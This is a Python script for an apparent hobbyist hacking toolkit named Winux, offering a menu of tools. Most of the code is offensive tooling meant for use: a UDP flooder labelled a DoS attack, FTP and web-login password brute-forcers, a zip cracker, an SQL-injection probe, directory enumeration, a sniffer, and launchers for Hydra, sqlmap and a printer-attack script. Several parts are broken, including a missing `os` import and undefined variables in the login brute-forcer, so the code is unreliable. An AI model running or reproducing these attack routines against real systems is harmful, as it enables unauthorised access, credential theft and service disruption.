def str_list(your_list,inline=True):
    yourlist=str(your_list)
    list_1=yourlist.replace('[','')
    list_2=list_1.replace(']','')
    if inline==True:
        list_3=list_2.replace(',',' ')
    else:
        list_3=list_2.replace(',','\n')
    list_4=list_3.replace('"','')
    list_=list_4.replace("'",'')
    return str(list_)

def str_dco(your_list,inline=True):
    yourlist=str(your_list)
    list_1=yourlist.replace('{','')
    list_2=list_1.replace('}','')
    if inline==True:
        list_3=list_2.replace(',',' ')
    else:
        list_3=list_2.replace(',','\n')
    list_4=list_3.replace('"','')
    list_=list_4.replace("'",'')
    return str(list_)


import sys,time,random,socket,subprocess
from zipfile import ZipFile
try:
    from termcolor import *
    from colorama import *
except:
    er="install the termcolor [pip install termcolor ] and [pip install colorama]"
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
    time.sleep(2)
print(colored("[","white")+colored(" ● ","green")+colored("]","white")+" Loding "+colored("[","white")+colored(" ● ","green")+colored("]","white"),end='')
try:
    import requests
    print(".",end='')
except:
    er=colored("install the requests [pip install requests ]\n","red")
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
try:
    import selenium
    print('..',end='')
except:
    er=colored("install the selenium [pip install selenium ]\n","red")
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

try:
    import ftplib
except:
    er=colored("install the ftplib [pip install ftplib ]\n","red")
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
try:
    import scapy.all
    print('...',end='')
except:
    er=colored("install the scapy [pip install scapy ]\n","red")
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
try:
    import whois
    print('....',end='')
except:
    er=colored("install the whois from the needtools dir [pip isntall \\needtools\\whois\\whois ]","red")
    for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
try:
    from lxml import html
    print('......',end='\n')
except:
   er=colored("install the lxml [pip install lxml ]","red")
   for i in er:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03) 
time.sleep(2)

#----------------------mudols-------------------------------

def main2():
    print()
    while 1:
        print(colored("[#] Enter your command ","white"),colored("$=> ","red"),end='')
        command=input()
        if command=="!":
            print(colored("[","white"),colored(" ! ","red"),colored("]","white"),colored(" Exit ","red"),colored("[","white"),colored(" ! ","red"),colored("]","white"))
            sys.exit(0)
        elif command=="?":
            help_()
        elif command=="1" or command=="01":
            portsc()
        elif command=="2" or command=="02":
            Netst()
        elif command=="3" or command=="03":
            sqlsc()
        elif command=="4" or command=="04":
            Dos()
        elif command=="5" or command=="05":
            elms()
        elif command=="6" or command=="06":
            host_tp()
        elif command=="7" or command=="07":
            who()
        elif command == "8" or command == "08":
            os.startfile("Hydra\\blackhydra.exe")
        elif command == "9" or command=="09":
            cr()
        elif command=="10":
            arp()
        elif command=="11":
            sniffer()
        elif command=="12":
            winux_ed()
        elif command=="13":
            nanoEditor()
        elif command=="15":
            ping()
        elif command=="14":
            nmap()
        elif command=="16":
            prt()
        elif command=="17":
            myop()
        elif command=="18":
            add_op()
        elif command=="19":
            del_op()
        elif command=="20":
            ftp()
        elif command=="21":
            zip_cr()
        elif command=="22":
            sqlmap()
        elif command=="23":
            webdir()
        elif command=="24":
            dwo()
        elif command=="25":
            hed()
        elif command=="26":
            ip_live()
        elif command=="27":
            brut()
        elif command=="28":
            rea()
        else:
            print(colored("[ X ] Unkonw Command [ X ]","red","on_white"))

init()
winux="""
   █  █  █ ▀ ████ █  █ █ █
   █  █  █ █ █  █ █  █  █
   ███████ █ █  █ ████ █ █
"""
vir="""
[                      virson : 1.0.1                        ]
[                      coder : protel                        ]
"""
def op(opto):
    print(colored("[","white"),colored(" ● ","yellow"),colored("]","white"),colored(opto,"yellow"))


def help_():
    op("    [01] Port scaner     [02] Netstat")
    op("    [03] Sql scaner      [04] Dos attack")
    op("    [05] Element scaner  [06] Host to IP")
    op("    [07] Whois           [08] Black Hydra")
    op("    [09] Crunch          [10] ARP")
    op("    [11] Sniff Net       [12] Winux Editor")
    op("    [13] Nano Editor     [14] Nmap")
    op("    [15] Ping            [16] Printers hack")
    op("    [17] My options      [18] Add option")
    op("    [19] Del option      [20] FTP")
    op("    [21] Zip cracker     [22] Sql Map")
    op("    [23] Web Dirs        [24] Download web")
    op("    [25] Headers Web     [26] Live ip network")
    op("    [27] Brut force web  [28] Type a file")
    print(colored("[","white"),colored(" ! ","red"),colored("]","white"),colored(" Exit"))
    print(colored("[","white"),colored(" ? ","green"),colored("]","white"),colored(" Help"))
    main2()


col_lis=["red","blue","white","yellow","green"]
col=random.choice(col_lis)
def main():
    print(colored("[ % virsion 1.0.1 % ]",col))
    print(colored(winux,col))
    help_()

def portsc():
    try:
        print(colored("[ Port Scaner ]","green"))
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print(colored("[#] Enter your target ","white"),colored("$=> ","red"),end='')
        target=input()
        print(colored("[#] Enter your port ( 00==winux ports) ","white"),colored("$=> ","red"),end='')
        ports=input()
        if ports=="00":
            port_list=[20,21,22,23,25,53,80,110,119,123,143,161,194,443]
            for port in port_list:
                r=s.connect_ex((target,port))
                if r==0:
                    if port == 20:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" File Transfer Protocol (FTP) Data Transfer","green"))
                    elif port == 21:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" File Transfer Protocol (FTP) Command Control","green"))
                    elif port == 443:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" HTTP Secure (HTTPS) HTTP over TLS/SSL","green"))
                    elif port == 22:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" Secure Shell (SSH)","green"))
                    elif port == 23:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" Telnet - Remote login service, unencrypted text messages","green"))
                    elif port == 25:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" Simple Mail Transfer Protocol (SMTP) E-mail Routing","green"))
                    elif port == 53:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" Domain Name System (DNS) service","green"))
                    elif port == 80:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+" Hypertext Transfer Protocol (HTTP) used in World Wide Web","green"))
                    elif port == 110:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Post Office Protocol (POP3) used by e-mail clients to retrieve e-mail from a server ","green"))
                    elif port == 119:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Network News Transfer Protocol (NNTP)","green"))
                    elif port == 123:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Network Time Protocol (NTP)","green"))
                    elif port == 143:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Internet Message Access Protocol (IMAP) Management of Digital Mail","green"))
                    elif port == 161:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Simple Network Management Protocol (SNMP)","green"))
                    elif port == 194:
                        print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port)+"	Internet Relay Chat (IRC)","green"))
                else:
                    if port == 20:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" File Transfer Protocol (FTP) Data Transfer","red"))
                    elif port == 21:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" File Transfer Protocol (FTP) Command Control","red"))
                    elif port == 443:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" HTTP Secure (HTTPS) HTTP over TLS/SSL","red"))
                    elif port == 22:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" Secure Shell (SSH)","red"))
                    elif port == 23:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" Telnet - Remote login service, unencrypted text messages","red"))
                    elif port == 25:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" Simple Mail Transfer Protocol (SMTP) E-mail Routing","red"))
                    elif port == 53:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" Domain Name System (DNS) service","red"))
                    elif port == 80:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+" Hypertext Transfer Protocol (HTTP) used in World Wide Web","red"))
                    elif port == 110:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Post Office Protocol (POP3) used by e-mail clients to retrieve e-mail from a server ","red"))
                    elif port == 119:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Network News Transfer Protocol (NNTP)","red"))
                    elif port == 123:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Network Time Protocol (NTP)","red"))
                    elif port == 143:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Internet Message Access Protocol (IMAP) Management of Digital Mail","red"))
                    elif port == 161:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Simple Network Management Protocol (SNMP)","red"))
                    elif port == 194:
                        print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port)+"	Internet Relay Chat (IRC)","red")) 
        else:
            print(colored("[#] From port "+ports+" to","white"),colored("$=> ","red"),end='')
            po=input()
            for port in range(int(ports),int(po)):
                r=s.connect_ex((target,port))
                if r==0:
                    print(colored("[","white"),colored(" ● ","green"),colored("] ","white"),colored("open ==> "+str(port),"green"))
                else:
                    print(colored("[","white"),colored(" ● ","red"),colored("] ","white"),colored("close ==> "+str(port),"red"))
        main2()
    except KeyboardInterrupt:
        main2()

def Netst():
    try:
        print(colored("[  Netstat ]","green"))
        print("[#] Enter the switch ",colored("$=> ","red"),end='')
        sw=input()
        nt="netstat "+sw
        cmd=subprocess.Popen(nt,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        print(colored(str(cmd.stdout.read()+cmd.stderr.read(),'utf-8'),"green"))
        main2()
    except KeyboardInterrupt:
        main2()

def sqlsc():
    try:
        print(colored("[ Sql Scanner ]","green"))
        opt=['"',"/","'"]
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        tar=input()
        try:
            norm_p=requests.get(tar)
            x=1
        except:
            print(colored("[ X ] cant find the target [ X ]","red"))
            x=0
        if x==1:
            webp_2=html.fromstring(norm_p.content)
            for op in opt:
                targ=tar+op
                page=requests.get(targ)
                webp=html.fromstring(page.content)
                if webp.find("sql"):
                    print("["+colored(" ● ","green")+"]"+colored(" sql error find in "+op,"green"))
                else:
                    print("["+colored(" ● ","red")+"] "+colored(" sql error not find in "+op,"red"))
        else:
            pass
        main2()
    except KeyboardInterrupt:
        main2()

def Dos():
    try:
        print(colored("[ Dos ]","green"))
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        tar=input()
        print("[#] Enter the port ",colored("$=> ","red"),end='')
        port=int(input())
        print("[#] count of attack ",colored("$=> ","red"),end='')
        count=int(input())
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        try:
            test=socket.gethostbyname(tar)
            x=1
        except:
            print(colored("[ X ] cant find the taget [ X ]","red"))
            x=0
        if x==1:
            print(colored("connect...","green"))
            digits= len(str(count - 1))
            delete="\b" * (digits)
            print("[",colored(" ● ","green"),"]" ," attack on part  \t",end='')
            time.sleep(1)
            for i in range(count):
                    s.sendto("DOS atc".encode(),(tar,port))
                    print(colored("{0}{1:{2}}".format(delete, i, digits),"yellow"),end='')
                    sys.stdout.flush()
            print()
        else:
            pass
        main2()
    except KeyboardInterrupt:
        main2()

def elms():
    try:
        print(colored("[ Element Scaner ]","green"))
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        tar=input()
        try:
            x=requests.get(tar)
            y=1
        except:
            y=0
        if y==1:
            print("[#] Enter the Element ",colored("$=> ","red"),end='')
            elm=input()
            print("[#] Enter the Type ",colored("$=> ","red"),end='')
            typ=input()
            page=requests.get(tar)
            web=html.fromstring(page.content)
            webpage=str_list(web.xpath('//'+elm+'/@'+typ),inline=False)
            print(colored(webpage,"green"))
        else:
            print(colored("[ X ] target was not found [ X ]","red"))
        main2()
    except KeyboardInterrupt:
        main2()
def host_tp():
    try:
        print(colored("[ Host To IP ]","green"))
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        tar=input()
        try:
            x=socket.gethostbyname(tar)
            print("[",colored(" ● ","green"),"]",colored(x,"green"))
        except:
            print(colored("[ X ] cant find target [ X ]","red"))
        main2()
    except KeyboardInterrupt:
        main2()

def who():
    try:
        print(colored("[ Whois ]","green"))
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        target=input()
        w=whois.whois(str(target))
        print(colored(str_dco(w,inline=False),"green"))
        main2()
    except KeyboardInterrupt:
        main2()
def cr():
    try:
        print(colored("[ crunch ]","green"))
        print("[#] Enter the command of crunch ",colored("$=> ","red"),end='')
        all_=input()
        os.system("cr\\crunch.exe "+all_)
        main2()
    except KeyboardInterrupt:
        main2()
def arp():
    try:
        print(colored("[ ARP ]","green"))
        print("[#] Enter the swich ",colored("$=> ","red"),end='')
        su=input()
        arp = "arp "+su
        cmd=subprocess.Popen(arp,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        ou=cmd.stdout.read()+cmd.stderr.read()
        out=str(ou,"utf-8")
        print(colored(out,"green"))
        main2()
    except KeyboardInterrupt:
        main2()
def sniffer():
    try:
        print(colored("[ Sniff Net ]","green"))
        print("[#] Enter the count of sniff ",colored("$=> ","red"),end='')
        co=int(input())
        for i in range(0,co):
            x=scapy.all.sniff(iface=scapy.all.conf.iface,count=1)
            print(colored(x.nsummary(),"green"))
        main2()
    except KeyboardInterrupt:
        main2()
def nanoEditor():
    try:
        os.system("nano")
        main2()
    except KeyboardInterrupt:
        main2()
def ping():
    try:
        print(colored("[ ping ]","green"))
        print("[#] Enter the swich ",colored("$=> ","red"),end='')
        sw=input()
        ping="ping "+sw
        cmd=subprocess.Popen(ping,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=str(cmd.stdout.read(),"utf-8")+str(cmd.stderr.read(),"utf-8")
        print(colored(output,"green"))
        main2()
    except KeyboardInterrupt:
        main2()

def nmap():
    try:
        print(colored("[ nmap ]","green"))
        print("[#] Enter thh switch and target",colored(" $=> ","red"),end='')
        sw=input()
        nmap="nmap\\nmap.exe "+sw
        cmd=subprocess.Popen(nmap,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=str(cmd.stdout.read(),"utf-8")+str(cmd.stderr.read(),"utf-8")
        print(colored(output,"green"))
        main2()
    except KeyboardInterrupt:
        main2()
def prt():
    os.startfile("printer\\pret.py")
    main2()

def myop():
    try:
        print(colored("[ My Option ]","green"))
        op_list=[]
        print(colored("loding","green"),end='')
        for r,d,f in os.walk("myop"):
            print(colored("...","green"))
            for file in f:
                op=file.replace("[",'\t')
                op2=op.replace("]",'')
                op3=op2.replace("'",'')
                op4=op3.replace(",","\t\n")
                print("[ "+colored("●","green")+" ] "+ op4 +"[ "+colored("●","green")+" ] ")
                op_list.append(file)
            if len(op_list)==0:
                print(colored("[ X ] cant find the option [ X ]","red"))
            else:
                while 1:
                    print(colored("[#] enter the file name of optons (00 == exit ; ? == help) ","white"),colored("$=> ","red"),end='')
                    com=input()
                    if com=="00":
                        break
                    elif com=="?":
                        for file in f:
                            op=file.replace("[",'\t')
                            op2=op.replace("]",'')
                            op3=op2.replace("'",'')
                            op4=op3.replace(",","\t\n")
                            print("[ "+colored("●","green")+" ] "+ op4 +"[ "+colored("●","green")+" ] ")
                    else:
                        try:
                            try:
                                o=open("myop\\"+com,"r")
                            except:
                                print(colored("[ X ] option not found [ X ]","red"))
                                o=0
                            if o==0:
                                pass
                            else:
                                path=o.read()
                                print(colored('[#] option was found enter the command ',"white"),colored("$=> ","red"),end='')
                                commands=input()
                                if len(commands)==0:
                                    inter='"'+path+"\\"+com+'"'
                                    os.startfile(inter)
                                else:
                                    inter='"'+path+"\\"+com+'"'+" "+commands
                                    cmd=subprocess.Popen(inter,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                                    ou=cmd.stdout.read()+cmd.stderr.read()
                                    out=str(ou,'utf-8')
                                    print(colored(out,"green"))
                        except:
                            print(colored("[ X ] Error [ X ]","red"))


        main2()
    except KeyboardInterrupt:
        main2()
def del_op():
    try:
        print(colored("[ Del Option ]","green"))
        print(colored("[#] enter the name of option ","white"),colored("$=> ","red"),end='')
        name=input()
        try:
            os.remove("myop\\"+name)
            print(colored("[\/] was sucsess ! [\/]",'green'))
        except:
            print("[ ",colored("●","red")," ] Errror")
        main2()
    except KeyboardInterrupt:
        main2()
def add_op():
    try:
        print(colored("[ Add Option ]","green"))
        print(colored('[#] enter the name of file ','white'),colored('$=>  ','red'),end='')
        file=input()
        if "\\" in file:
            print(colored("[ ! ] just name of file [ ! ]","yellow","on_red"))
            add_op()
        else:
            print(colored('[#] enter the path of file ','white'),colored("$=> ",'red'),end='')
            path=input()
            try:
                o=open("myop\\"+file,'w')
                path2=path.replace("'","")
                o.write(path2)
                print(colored("complet sucsess!","green"))
            except:
                print(colored("[ X ] Error [ X ]","red"))
        main2()
    except KeyboardInterrupt:
        main2()

def ftp():
    try:
        print(colored("[ Ftp cracker ]","green"))
        def connect(host,username,password):
            ftp=ftplib.FTP()
            print(colored('trying -> {}:{}'.format(username,password),"red"))
            try:
                ftp.connect(host,21,timeout=5)
                ftp.login(username,password)
                return True
            except ftplib.error_perm:
                return False
        print("[#] Enter the ftp host",colored("$=> ","red"),end='')
        host=input()
        print("[#] Enter the file of crack",colored("$=> ","red"),end='')
        file=input()
        try:
            o=open(file,"r")
            o.close()
        except:
            print(colored("[ X ] cant find file [ X ]","red"))
            main2()
        print("[#] Enter the user name to crack them ( if your file have the user name and password Enter 00 )",colored("$=> ","red"),end='')
        user=input()
        if user=="00":
            for userpass in open(file):
                userpass=userpass.strip("\n")
                username=userpass.split(":")[0]
                password=userpass.split(":")[1]
                if connect(host,username,password):
                    print()
                    print("[ ",colored("●","green")," ] ",colored("target found: username: "+username+" password: "+password,"green"))
                    break
        else:
           for userpass in open(file):
                userpass=userpass.strip("\n")
                username=user
                password=userpass.split(":")[1]
                if connect(host,username,password):
                    print()
                    print("[ ",colored("●","green")," ] ",colored("target found: username: "+username+" password: "+password,"green"))
                    break
        main2()

    except KeyboardInterrupt:
        main2()
def zip_cr():
    try:
        print(colored("[ Zip Cracker ]","green"))
        pass_list=[]
        print("[#] Enter the zip file",colored("$=> ","red"),end='')
        file=input()
        print("[#] Enter the passwird list file ",colored("$=> ","red"),end='')
        file_d=input()
        for password in open(file_d):
            password2=password.replace("\n","")
            pass_list.append(password2)
        print("[ ",colored("●","green")," ] ",colored("start crack","green"))
        for passwords in pass_list:
            with ZipFile(file) as zf:
                try:
                    zf.extractall(pwd=bytes(passwords,"utf-8"))
                    print("[ ",colored("●","green")," ]",colored(" password found : "+passwords,"green"))
                    break
                except:
                    print("[ ",colored("●","red")," ]",colored(" password faild : "+passwords,"red"))
        main2()
    except KeyboardInterrupt:
        main2()

def webdir():
    try:
        print(colored("[ Web Dires ]","green"))
        dir_list=[]
        print("[#] Enter the web target",colored("$=> ","red"),end='')
        target=input()
        print("[#] Enter the directory list",colored("$=> ","red"),end='')
        l_dir=input()
        for d in open(l_dir):
            d2=d.replace("\n","")
            dir_list.append(d2)
        for dirs in dir_list:
            web=requests.get(target+dirs)
            if web.status_code==200:
                print("[ ",colored("●","green")," ]",colored(" directory find : "+web.url,"green"))
            else:
                print("[ ",colored("●","red")," ]",colored(" directory faild : "+web.url,"red"))
        main2()
    except KeyboardInterrupt:
        main2()

def dwo():
    try:
        print(colored("[ Download web ]","green"))
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        web=input()
        print("[#] Enter the path to save ",colored("$=> ","red"),end='')
        path=input()
        try:
            web2=requests.get(web)
        except:
            print("[ ",colored("●","red")," ]",colored("Cant find the target","red"))
            main2()
        try:
            o=open(path,"w")
            o.write(str(web2._content,'utf-8'))
            o.close()
            print("[ ",colored("●","green")," ]>>",colored(" saved sucessfully on "+path,"green"))            
        except:
            print("[ ",colored("●","red")," ]",colored("cant save the file on "+path,"red"))
        main2()
    except KeyboardInterrupt:
        main2()

def hed():
    try:
        print(colored("[ Headers Web ]","green"))
        print("[#] Enter the target",colored("$=> ","red"),end='')
        target=input()
        try:
            web=requests.get(target)
            x=web.headers
            print(colored(str_dco(x,inline=False),"green"))
        except:
            print("[ ",colored("●","red")," ]",colored("Cant find the target","red"))
        main2()
    except KeyboardInterrupt:
        main2()

def sqlmap():
    try:
        print("[#] Enter the url",colored("$=> ","red"),end='')
        url=input()
        print("[#] Enter the switch ",colored("$=> ","red"),end='')
        sw=input()
        os.system("sqlmap\\sqlmap.py -u"+url+" "+sw)
        main2()
    except KeyboardInterrupt:
        main2()
def winux_ed():
    try:
        os.startfile("needtools\\nt.exe")
        print(colored("[ starting notepad ]","green"))
        main2()
    except:
        main2()

def ip_live():
    try:
        print(colored("[ Live ip network ]","green"))
        print("[#] Enter the target URL",colored("$=> ","red"),end='')
        target=input()
        ip=socket.gethostbyname(target)
        ip2=ip[:12]
        for i in range(0,257):
            try:
                live=socket.gethostbyaddr(str(ip2)+str(i))
                print("[ ",colored("●","green")," ]",colored(" IP is live : "+str(live),"green"))
            except:
                print("[ ",colored("●","red")," ]",colored(" IP is not live : "+str(live),"red"))
        main2()
    except KeyboardInterrupt:
        main2()
def brut():
    try:
        sub_m=[]
        pass_list=[]
        element_list=[]
        print("[#] Enter the target ",colored("$=> ","red"),end='')
        target=input()
        try:
            r=requests.get(target)
            print("[ ",colored("●","green")," ]",colored(" target was found","green"))
        except:
            print("[ ",colored("●","red")," ]",colored(" target was not found","red"))
            main2()
        page=requests.get(target)
        web=html.fromstring(page.content)
        webpage=web.xpath('//input/@type')
        sub=web.xpath("//input/@type")
        print(sub)
        if "submit" in sub or "button" in sub:
            print(colored("Submit button was found: "+str_list(sub),"green"))
            sub_m.append(sub)
        else:
            print(colored("[ X ] Submit button was not found","red"))
            main2()
        if len(webpage)==0:
            print(colored("[ X ] Element was not exists its not a login page [ X ]","red"))
            main2()
        else:
            if "password" and "text" in webpage:
                x=web.xpath("//input/@name")
                for i in x:
                    element_list.append(i)
            print(colored(" Element was found by name : "+str_list(element_list),"green"))
    
        print("[#] Enter the user name ",colored("$=> ","red"),end='')
        user=input()
        print("[#] Enter the password list ",colored("$=> ","red"),end="")
        passw=input()
        for passwords in open(passw):
            p=passwords.replace("\n","")
            pass_list.append(p)
        for passwordss in pass_list:
            print(colored("[ ] Try : "+password,"yellow"))
            username=str(element_list[0])
            password=str(element_list[1])
            submit=str(element_list[2])
            print(username,password,submit)
            http=requests.put(target,data={username:user,password:passwordss,submit:"submit"})
            if http.url==target:
                print("[ ",colored("●","red")," ]",colored(" password was wrung: "+passwordss,"red"))
            else:
                print("[ ",colored("●","green")," ]",colored(" password was found: "+passwordss,"green"))
                break
    except KeyboardInterrupt:
        main2()
def rea():
    try:
        print("[#] Enter the name of file ",colored("$=> ","red"),end='')
        f=input()
        for i in open(f):
            i2=i.replace("\n","")
            print(colored(i2,"green"))
    except KeyboardInterrupt:
        main2()
def insta_crack():
    try:
        proxy_list={}
        file=input("exter the file: ")
        for proxy in open(file):
            po=proxy.split(">")
            proxy_list[po[0]]=po[1].replace("\n","")
    except KeyboardInterrupt:
        main2()
#------------------------end def--------------------------------------------

main()

